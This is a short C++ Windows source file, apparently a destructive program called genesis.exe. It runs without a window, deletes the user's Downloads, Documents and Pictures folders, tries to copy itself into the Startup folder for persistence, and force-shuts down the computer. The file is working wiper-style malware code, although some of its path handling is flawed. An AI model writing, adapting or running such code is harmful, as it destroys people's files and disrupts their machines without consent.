#include "Header.h"


int APIENTRY wWinMain(HINSTANCE Instance, //no window
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {

	char* userpath = getenv("USERPROFILE"); //get %userprofile% path
	std::string path;
	std::string pathb;
	std::string pathc;
		if (userpath != nullptr)
			path = std::string(userpath) + "\\Downloads";
			pathb = std::string(userpath) + "\\Documents";
			pathc = std::string(userpath) + "\\Pictures";

	//char filepath[] = "%userprofile%\\Downloads";
	//char filepathb[] = "%userprofile%\\Pictures";
	//char filepathc[] = "%userprofile%\\Documents";
	if (std::filesystem::exists(path)) { //deletes files under directories
		
		std::filesystem::remove_all(path);
		std::filesystem::remove_all(pathb);
		std::filesystem::remove_all(pathc);
	}
	
	char filename[ MAX_PATH ] = "genesis.exe"; 
	char newLocation[] = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	if (std::filesystem::exists("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\genesis.exe")) {
		
		exit(0);
	}
	else {

		BOOL stats = 0;
		DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH); //copies itself to starup folder
		if (size)
			CopyFileA(filename, newLocation, stats);
	}
	
	ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, //shuts down computer
		SHTDN_REASON_MINOR_OTHER);

	return 0;
}